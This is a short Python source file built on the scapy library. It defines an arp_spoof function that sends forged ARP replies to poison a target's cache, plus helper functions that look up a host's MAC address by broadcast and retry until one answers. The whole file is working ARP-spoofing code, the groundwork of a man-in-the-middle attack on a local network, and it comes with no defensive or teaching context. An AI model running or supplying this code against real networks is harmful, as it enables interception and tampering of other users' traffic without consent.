import scapy.all as scapy

def arp_spoof(target_ip, target_mac, spoof_ip):
    # The func create arp request and send it
    packet = scapy.ARP(pdst=target_ip, hwdst=target_mac, psrc=spoof_ip, op="is-at")
    scapy.send(packet, verbose=False)

def get_mac(ip):
    # The func return mac address of the ip address
    arp_request = scapy.ARP(pdst=ip)
    broadcast = scapy.Ether(dst="ff:ff:ff:ff:ff:ff")
    arp_request_broadcast = broadcast / arp_request
    answ, _ = scapy.srp(arp_request_broadcast, timeout=3, verbose=False)
    if answ:
        return answ[0][1].src
    return None

def find_mac(ip):
    # The func makes sure the mac address for the ip is found
    mac = None
    while not mac:
        mac = get_mac(ip)
    return mac

